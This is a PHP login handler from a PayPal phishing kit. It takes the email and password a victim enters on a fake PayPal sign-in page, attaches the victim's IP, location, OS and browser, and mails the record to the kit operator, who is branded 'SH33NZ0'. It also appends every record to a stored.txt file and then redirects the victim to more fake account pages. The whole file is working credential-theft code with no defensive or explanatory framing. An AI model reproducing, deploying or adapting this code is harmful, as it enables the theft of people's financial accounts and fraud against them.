<?php @session_start();require_once '../anti/anti0.php';require '../anti/anti1.php';require '../anti/anti2.php';require '../anti/anti3.php';require '../anti/anti4.php';include 'config.php';
function isEmail($eml){
	$pa="/^(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){255,})(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){65,}@)(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22))(?:\\.(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\]))$/iD";
return preg_match($pa,$eml);
}
function isPayPalPassword($pass){
	$pa='/^[a-zA-Z0-9_.!?@\/#$^*|(){}`;+-]{8,}$/';$prg=preg_match($pa,$pass);$deny=['0000','1234','1111','2222','3333','4444','4321','azer','qwer'];$check=true;foreach($deny as $key){if(strpos($pass,$key)!==false){$check=false;}}if($prg&&$check){return true;}else{return false;}}if(isset($_POST['EMAIL_LOGIN'])&&isset($_POST['PASSWORD'])){if(isEmail($_POST['EMAIL_LOGIN'])&&isPayPalPassword($_POST['PASSWORD'])){$_SESSION['email']=$_POST['EMAIL_LOGIN'];$_SESSION['password']=$_POST['PASSWORD'];$code=<<<EOT
============== [ New PayPal Login | {$dateNow} GMT] ==============
Email 		: {$_SESSION['email']}
Password 	: {$_SESSION['password']}
=-=-=-=-=-=-=-=-- ♣ ☠ |SH33NZ0| ☠ ♣-=-=-=-=-=-=-=-
✪[IP]			✪: {$_SESSION['ip']}
✪[Country]		✪: {$_SESSION['ip_countryName']}
✪[State]	    ✪: {$_SESSION['ip_state']}
✪[City]			✪: {$_SESSION['ip_city']}
✪[Zip] 			✪: {$_SESSION['ip_zip']}
✪[OS]			✪: {$_SESSION['os']}
✪[Browser]		✪: {$_SESSION['browser']}
✪[TimeZone]		✪: {$_SESSION['ip_timezone']}
============= [ ./New PayPal Login ] =============
\r\n\r\n
EOT;
$subject="New PayPal Login [{$_SESSION['email']}] From [{$_SESSION['ip_countryName']}]";
$headers="From: |☠SH33NZ0☠| PPL BANK <SH33NZ0@GMAIL.COM>\r\n";
$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/plain; charset=UTF-8\r\n";@mail($yours,$subject,$code,$headers);$save=fopen("../stored.txt","a+");fwrite($save,$code);fclose($save);if($skip_activity){exit(header("Location: myaccount/restore.php?sessionid={$_SESSION['randString']}&sslmode=true"));}else{exit(header("Location: activity.php?sessionid={$_SESSION['randString']}&sslmode=true"));}}else{$_SESSION['loginError']=true;exit(header("Location: signin.php?country.x={$_SESSION['ip_countryCode']}&locale.x={$_SESSION['language']}_{$_SESSION['ip_countryCode']}"));}}else{exit(header("Location: index.php"));}?>